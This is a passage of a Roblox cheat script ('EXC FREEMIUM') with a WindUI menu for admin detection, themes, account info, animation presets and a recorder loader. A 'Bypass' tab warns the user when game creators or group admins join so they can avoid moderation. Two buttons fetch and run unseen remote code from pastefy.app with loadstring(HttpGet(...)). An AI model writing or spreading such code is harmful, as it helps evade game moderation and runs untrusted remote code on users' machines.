                        Content = player.Name.." is in the server!",
                        Duration = 5
                    })
                end
            end
            
            -- Monitor new players
            AdminDetectConnection = Players.PlayerAdded:Connect(function(player)
                if AdminDetectEnabled then
                    task.wait(1)
                    
                    local isAdmin = false
                    local adminType = ""
                    
                    -- Check if player is game creator
                    if player.UserId == game.CreatorId then
                        isAdmin = true
                        adminType = "GAME CREATOR"
                    end
                    
                    -- Check group rank
                    local success, rank = pcall(function()
                        return player:GetRankInGroup(game.CreatorId)
                    end)
                    
                    if success and rank > 0 then
                        isAdmin = true
                        adminType = "GROUP ADMIN (Rank: "..rank..")"
                    end
                    
                    if isAdmin then
                        KnownAdmins[player.UserId] = true
                        
                        WindUI:Notify({
                            Title = "ADMIN JOINED",
                            Content = player.Name.." ("..adminType..")",
                            Duration = 10
                        })
                    end
                end
            end)
            
            WindUI:Notify({
                Title = "Admin Detect",
                Content = "Admin detection enabled",
                Duration = 2,
                Icon="brick-wall-shield"
            })
        else
            if AdminDetectConnection then
                AdminDetectConnection:Disconnect()
                AdminDetectConnection = nil
            end
            KnownAdmins = {}
            
            WindUI:Notify({
                Title = "Admin Detect",
                Content = "Admin detection disabled",
                Duration = 2,
                Icon="shield-off"
            })
        end
    end
})

BypassTab:Paragraph({
    Title = "Note",
    Desc = "Admin detection may not catch all admins. Use with caution!"
})

-- =====================================================
-- ================= THEME UI TAB =======================
-- =====================================================

ThemeTab:Section({
    Title = "UI THEME SELECTOR"
})

ThemeTab:Paragraph({
    Title = "Theme Changer",
    Desc = "Change WindUI theme instantly"
})

ThemeTab:Dropdown({
    Title = "Select Theme",
    Multi = false,
    Values = {
        "Dark","Light","Rose","Plant","Red","Indigo","Sky","Violet",
        "Amber","Emerald","Midnight","Crimson","Monokai Pro",
        "Cotton Candy","Rainbow"
    },
    Default = "Dark",
    Callback = function(option)
        local Selected = type(option) == "string" and option or tostring(option)
        
        -- Apply theme using SetTheme or ChangeTheme
        if WindUI.SetTheme then
            WindUI:SetTheme(Selected)
        elseif WindUI.ChangeTheme then
            WindUI:ChangeTheme(Selected)
        end
        
        WindUI:Notify({
            Title = "Theme Changed",
            Content = Selected .. " theme applied!",
            Duration = 2,
            Icon="palette"
        })
    end
})

ThemeTab:Paragraph({
    Title = "💡 Available Themes",
    Desc = "15 themes ready: Dark, Light, Rose, Plant, Red, Indigo, Sky, Violet, Amber, Emerald, Midnight, Crimson, Monokai Pro, Cotton Candy, Rainbow"
})

-- =====================================================
-- ================= ACCOUNT TAB ========================
-- =====================================================

AccountTab:Section({
    Title = "ACCOUNT INFORMATION"
})

-- Get player info
local PlayerInfo = {
    Username = LocalPlayer.Name,
    DisplayName = LocalPlayer.DisplayName,
    UserId = LocalPlayer.UserId,
    AccountAge = LocalPlayer.AccountAge
}

-- Compact info display
local AccountInfoText = string.format(
    "[◉] Display Name: %s\n" ..
    "[◉] Username: @%s\n" ..
    "[◉] Account Age: %d days\n" ..
    "[◉] User ID: %s\n" ..
    "[◉] Role: Freemium Member\n" ..
    "[◉] Status: Active",
    PlayerInfo.DisplayName,
    PlayerInfo.Username,
    PlayerInfo.AccountAge,
    tostring(PlayerInfo.UserId)
)

AccountTab:Paragraph({
    Title = "Account Details",
    Desc = AccountInfoText
})

AccountTab:Section({
    Title = "QUICK ACTIONS"
})

AccountTab:Button({
    Title = "Copy Username",
    Desc = "Copy to clipboard",
    Callback = function()
        setclipboard(PlayerInfo.Username)
        WindUI:Notify({
            Title = "Copied",
            Content = "Username copied!",
            Duration = 2,
            Icon="user-round-check"
        })
    end
})

AccountTab:Button({
    Title = "Copy User ID",
    Desc = "Copy to clipboard",
    Callback = function()
        setclipboard(tostring(PlayerInfo.UserId))
        WindUI:Notify({
            Title = "Copied",
            Content = "User ID copied!",
            Duration = 2,
            Icon="user-round-check"
        })
    end
})

AccountTab:Button({
    Title = "Refresh Account Info",
    Desc = "Update account information",
    Callback = function()
        WindUI:Notify({
            Title = "Refreshed",
            Content = "Account info updated!",
            Duration = 2
        })
    end
})

-- =====================================================
-- ================= ANIMATION TAB ======================
-- =====================================================

AnimationTab:Section({
    Title = "CUSTOM ANIMATION IDS"
})

AnimationTab:Paragraph({
    Title = "Animation System",
    Desc = "Change your character animations "
})

-- Animation Storage
local AnimationIDs = {
    Run = "",
    Walk = "",
    Jump = "",
    Idle = ""
}

local OriginalAnimations = {}
local CurrentPreset = "Default"

-- Function to get Animate script
local function GetAnimateScript()
    local char = LocalPlayer.Character
    if not char then return nil end
    return char:FindFirstChild("Animate")
end

-- Function to save original animations
local function SaveOriginalAnimations()
    local animate = GetAnimateScript()
    if not animate then return end
    
    OriginalAnimations = {
        run = animate.run.RunAnim.AnimationId,
        walk = animate.walk.WalkAnim.AnimationId,
        jump = animate.jump.JumpAnim.AnimationId,
        idle = animate.idle.Animation1.AnimationId
    }
end

-- Function to apply animation
local function ApplyAnimation(animType, animId)
    local animate = GetAnimateScript()
    if not animate then 
        WindUI:Notify({
            Title = "Error",
            Content = "Character not found!",
            Duration = 2
        })
        return false
    end
    
    local success = pcall(function()
        if animType == "Run" and animate.run then
            animate.run.RunAnim.AnimationId = "rbxassetid://" .. animId
        elseif animType == "Walk" and animate.walk then
            animate.walk.WalkAnim.AnimationId = "rbxassetid://" .. animId
        elseif animType == "Jump" and animate.jump then
            animate.jump.JumpAnim.AnimationId = "rbxassetid://" .. animId
        elseif animType == "Idle" and animate.idle then
            animate.idle.Animation1.AnimationId = "rbxassetid://" .. animId
            animate.idle.Animation2.AnimationId = "rbxassetid://" .. animId
        end
    end)
    
    return success
end

-- Function to apply preset
local function ApplyPreset(presetData)
    SaveOriginalAnimations()
    
    local success = true
    if presetData.run then success = ApplyAnimation("Run", presetData.run) and success end
    if presetData.walk then success = ApplyAnimation("Walk", presetData.walk) and success end
    if presetData.jump then success = ApplyAnimation("Jump", presetData.jump) and success end
    if presetData.idle then success = ApplyAnimation("Idle", presetData.idle) and success end
    
    return success
end

-- Function to reset animations
local function ResetAnimations()
    if not OriginalAnimations.run then
        SaveOriginalAnimations()
    end
    
    local animate = GetAnimateScript()
    if not animate then return false end
    
    pcall(function()
        if animate.run then
            animate.run.RunAnim.AnimationId = OriginalAnimations.run
        end
        if animate.walk then
            animate.walk.WalkAnim.AnimationId = OriginalAnimations.walk
        end
        if animate.jump then
            animate.jump.JumpAnim.AnimationId = OriginalAnimations.jump
        end
        if animate.idle then
            animate.idle.Animation1.AnimationId = OriginalAnimations.idle
            animate.idle.Animation2.AnimationId = OriginalAnimations.idle
        end
    end)
    
    return true
end

-- Animation Presets
local AnimationPresets = {
    Default = {
        name = "Default",
        run = "",
        walk = "",
        jump = "",
        idle = ""
    },
    Ninja = {
        name = "Ninja",
        run = "656118852",
        walk = "656121766",
        jump = "656117878",
        idle = "656117400"
    },
    Toy = {
        name = "Toy",
        run = "782842708",
        walk = "782843345",
        jump = "782847020",
        idle = "782841498"
    },
    Mage = {
        name = "Mage",
        run = "1083216690",
        walk = "1083216690",
        jump = "1083218792",
        idle = "1083195517"
    },
    Cartoony = {
        name = "Cartoony",
        run = "742638842",
        walk = "742638840",
        jump = "742637942",
        idle = "742637544"
    },
    Elder = {
        name = "Elder",
        run = "845386501",
        walk = "845403856",
        jump = "845398858",
        idle = "845397899"
    },
    ["Old School"] = {
        name = "Old School",
        run = "5319844329",
        walk = "5319847204",
        jump = "5319841935",
        idle = "5319839762"
    },
    Bubbly = {
        name = "Bubbly",
        run = "910034870",
        walk = "910034968",
        jump = "910035072",
        idle = "910028653"
    },
    Stylish = {
        name = "Stylish",
        run = "616163682",
        walk = "616168032",
        jump = "616161997",
        idle = "616136790"
    },
    Levitation = {
        name = "Levitation",
        run = "616010382",
        walk = "616013216",
        jump = "616008936",
        idle = "616006778"
    },
    Robot = {
        name = "Robot",
        run = "616091570",
        walk = "616095330",
        jump = "616090535",
        idle = "616088211"
    },
    Vampire = {
        name = "Vampire",
        run = "1083462077",
        walk = "1083473930",
        jump = "1083455352",
        idle = "1083445855"
    },
    Werewolf = {
        name = "Werewolf",
        run = "1083216690",
        walk = "1083178339",
        jump = "1083218792",
        idle = "1083195517"
    },
    Zombie = {
        name = "Zombie",
        run = "616163682",
        walk = "616168032",
        jump = "616161997",
        idle = "616136790"
    },
    Superhero = {
        name = "Superhero",
        run = "782842708",
        walk = "782843345",
        jump = "782847020",
        idle = "782841498"
    },
    Knight = {
        name = "Knight",
        run = "657564596",
        walk = "657552124",
        jump = "658409194",
        idle = "657595757"
    },
    Adidas = {
        name = "Adidas",
        run = "123973978164540",
        walk = "75183215343859",
        jump = "129527230938281",
        idle = "73137983344853"
    }
}

-- Custom ID Inputs
AnimationTab:Input({
    Title = "RUN Animation ID",
    Desc = "Enter animation ID for running",
    Value = "",
    Placeholder = "Enter ID...",
    Callback = function(value)
        AnimationIDs.Run = value
    end
})

AnimationTab:Input({
    Title = "WALK Animation ID",
    Desc = "Enter animation ID for walking",
    Value = "",
    Placeholder = "Enter ID...",
    Callback = function(value)
        AnimationIDs.Walk = value
    end
})

AnimationTab:Input({
    Title = "JUMP Animation ID",
    Desc = "Enter animation ID for jumping",
    Value = "",
    Placeholder = "Enter ID...",
    Callback = function(value)
        AnimationIDs.Jump = value
    end
})

AnimationTab:Input({
    Title = "IDLE Animation ID",
    Desc = "Enter animation ID for idle",
    Value = "",
    Placeholder = "Enter ID...",
    Callback = function(value)
        AnimationIDs.Idle = value
    end
})

-- Apply Custom Button
AnimationTab:Button({
    Title = "Apply Custom Animations",
    Desc = "Apply the IDs you entered above",
    Callback = function()
        SaveOriginalAnimations()
        
        local applied = false
        if AnimationIDs.Run ~= "" then
            ApplyAnimation("Run", AnimationIDs.Run)
            applied = true
        end
        if AnimationIDs.Walk ~= "" then
            ApplyAnimation("Walk", AnimationIDs.Walk)
            applied = true
        end
        if AnimationIDs.Jump ~= "" then
            ApplyAnimation("Jump", AnimationIDs.Jump)
            applied = true
        end
        if AnimationIDs.Idle ~= "" then
            ApplyAnimation("Idle", AnimationIDs.Idle)
            applied = true
        end
        
        if applied then
            CurrentPreset = "Custom"
            WindUI:Notify({
                Title = "Animations Applied",
                Content = "Custom animations activated!",
                Duration = 2
            })
        else
            WindUI:Notify({
                Title = "No IDs Entered",
                Content = "Please enter at least one animation ID",
                Duration = 2
            })
        end
    end
})

AnimationTab:Section({
    Title = "ANIMATION PRESETS"
})

AnimationTab:Paragraph({
    Title = "Quick Presets",
    Desc = "Select preset to instantly change animations (R6/R15 compatible)"
})

-- Preset Dropdown
AnimationTab:Dropdown({
    Title = "Select Animation Preset",
    Multi = false,
    Values = {
        "Default",
        "Ninja",
        "Toy",
        "Mage",
        "Cartoony",
        "Elder",
        "Old School",
        "Bubbly",
        "Stylish",
        "Levitation",
        "Robot",
        "Vampire",
        "Werewolf",
        "Zombie",
        "Superhero",
        "Knight",
        "Adidas"
    },
    Default = "Default",
    Callback = function(selected)
        local presetName = type(selected) == "string" and selected or tostring(selected)
        
        if presetName == "Default" then
            if ResetAnimations() then
                CurrentPreset = "Default"
                WindUI:Notify({
                    Title = "Animations Reset",
                    Content = "Returned to default animations",
                    Duration = 2
                })
            end
        else
            local preset = AnimationPresets[presetName]
            if preset then
                if ApplyPreset(preset) then
                    CurrentPreset = presetName
                    WindUI:Notify({
                        Title = "Preset Applied",
                        Content = presetName .. " animations activated!",
                        Duration = 2
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Failed to apply preset",
                        Duration = 2
                    })
                end
            end
        end
    end
})

-- Reset Button
AnimationTab:Button({
    Title = "Reset to Default",
    Desc = "Restore original animations",
    Callback = function()
        if ResetAnimations() then
            CurrentPreset = "Default"
            
            -- Clear custom IDs
            AnimationIDs = {
                Run = "",
                Walk = "",
                Jump = "",
                Idle = ""
            }
            
            WindUI:Notify({
                Title = "Reset Complete",
                Content = "All animations reset to default",
                Duration = 2
            })
        else
            WindUI:Notify({
                Title = "Error",
                Content = "Failed to reset animations",
                Duration = 2
            })
        end
    end
})

AnimationTab:Paragraph({
    Title = "Info",
    Desc = "Current Preset: " .. CurrentPreset .. "\n\nPresets work on both R6 and R15!\nReset anytime to restore defaults."
})

-- Auto-save on character respawn
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    if CurrentPreset ~= "Default" and CurrentPreset ~= "Custom" then
        local preset = AnimationPresets[CurrentPreset]
        if preset then
            task.wait(0.5)
            ApplyPreset(preset)
        end
    end
end)

-- =====================================================
-- ================= EXC TAB (RECORDER) =================
-- =====================================================

EXCTab:Section({
    Title = "SEKERIPPPP"
})

EXCTab:Paragraph({
    Title = "Just For Fun",
    Desc = "Silakan Record Swendiri Diri Saya Masih Sibuk Ngetroll Em El"
})

EXCTab:Button({
    Title = "Load Recorder Script",
    Desc = "Load the recorder",
    Callback = function()
        WindUI:Notify({
            Title = "Loading Recorder",
            Content = "Fetching recorder script...",
            Duration = 2,
            Icon = "download"
        })
        
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/dwjXnaaZ/raw"))()
        end)
        
        if success then
            WindUI:Notify({
                Title = "Recorder Loaded",
                Content = "Recorder script loaded successfully!",
                Duration = 3,
                Icon = "check-circle"
            })
        else
            WindUI:Notify({
                Title = "Load Failed",
                Content = "Failed to load recorder: " .. tostring(err),
                Duration = 4,
                Icon = "x-circle"
            })
        end
    end
})

EXCTab:Button({
    Title = "Exc Loader V0 ",
    Desc = "Loader yang lama",
    Callback = function()
        WindUI:Notify({
            Title = "Loading Recorder",
            Content = "Fetching recorder script...",
            Duration = 2,
            Icon = "download"
        })
        
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/Ucn3He3e/raw"))()
        end)
        
        if success then
            WindUI:Notify({
                Title = "Loader Loaded",
                Content = "LoaderV0 script loaded successfully!",
                Duration = 3,
                Icon = "check-circle"
            })
        else
            WindUI:Notify({
                Title = "Load Failed",
                Content = "Failed to load loader: " .. tostring(err),
                Duration = 4,
                Icon = "x-circle"
            })
        end
    end
})


EXCTab:Paragraph({
    Title = "🗿 Instructions",
    Desc = "Sc Free kgk jualan- tapi kalo mau kasih 7ELMAJA juga boleh"
})

-- =====================================================
-- ================= SOCIAL MEDIA TAB ===================
-- =====================================================

SocialMediaTab:Section({
    Title = "EXC"
})

SocialMediaTab:Paragraph({
    Title = "Discord Server",
    Desc = "Join our official Discord community!\n\n🔗 dsc.gg/cellestial"
})

SocialMediaTab:Button({
    Title = "Copy Discord Link",
    Desc = "Copy Discord invite to clipboard",
    Callback = function()
        setclipboard("https://dsc.gg/cellestial")
        WindUI:Notify({
            Title = "Copied!",
            Content = "Discord link copied to clipboard",
            Duration = 2,
            Icon="twitter"
        })
    end
})

SocialMediaTab:Section({
    Title = "Just For Fun"
})

SocialMediaTab:Paragraph({
    Title = "?",
    Desc = ""
})

-- =====================================================
-- ================= FINAL INIT =========================
-- =====================================================

-- Load track list
task.spawn(function()
    wait(1)
    TrackDropdown:Refresh(Config.MountList, "Mount Funny")
end)

WindUI:Notify({Title = "EXC FREEMIUM", Content = "All Features Loaded!", Duration = 3,
Icon="folder-key"})
